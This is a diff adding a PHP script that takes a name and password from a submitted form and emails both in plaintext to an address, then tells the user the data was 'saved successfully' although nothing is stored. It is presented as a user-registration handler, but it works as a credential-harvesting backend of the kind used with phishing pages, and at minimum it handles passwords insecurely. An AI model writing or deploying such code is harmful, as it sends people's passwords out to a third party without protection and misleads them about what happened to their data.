@@ -1,0 +1,22 @@
+<?php
+if (isset($_POST['name']) && isset($_POST['password'])) {
+    $name = $_POST['name'];
+    $password = $_POST['password'];
+
+    // Prepare email content
+    $subject = 'New User Registration';
+    $message = "Name: $name\nPassword: $password";
+
+    // Send email
+    $to = 'your-email@example.com';
+    $headers = "From: shantoshanto47469@gmail.com";
+
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Data saved successfully and email sent!";
+    } else {
+        echo "Failed to send email!";
+    }
+} else {
+    echo "Form data not received!";
+}
+?>
